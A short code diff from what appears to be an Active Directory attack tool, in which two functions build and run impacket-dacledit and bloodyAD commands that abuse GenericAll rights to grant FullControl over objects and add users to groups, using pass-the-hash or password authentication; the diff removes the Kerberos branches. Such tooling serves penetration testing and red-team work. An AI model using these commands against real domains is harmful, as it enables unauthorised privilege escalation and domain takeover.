@@ -32,8 +32,6 @@ def _do_user_genericall(session, target_dn, principal):
         auth = f"{session.domain}/{session.username} -hashes :{session.hash}"
     elif session.password:
         auth = f"{session.domain}/{session.username}:{session.password}"
-    else:
-        auth = f"{session.domain}/{session.username} -k --no-pass"
 
     cmd = (
         f'impacket-dacledit -action write -rights FullControl '
@@ -77,14 +75,7 @@ def _do_group_genericall(session, group, user_sam=None):
     elif session.password:
         auth = f"-u \"{session.username}\" -p \"{session.password}\""
         cmd = f"bloodyAD --host {session.target_ip} -d {session.domain} {auth} add groupMember \"{group}\" \"{user_sam}\""
-    else:
-        if not session.dc_hostname:
-            print(red("[-] Kerberos mode requires session.dc_hostname."))
-            return
-        cmd = (
-            f"bloodyAD --kerberos --host {session.dc_hostname} --dc-ip {session.dc_ip} "
-            f"-d {session.domain} add groupMember \"{group}\" \"{user_sam}\""
-        )
+
 
     print(blue(f"[*] Running: {cmd}"))
     out, err = run_command(cmd)
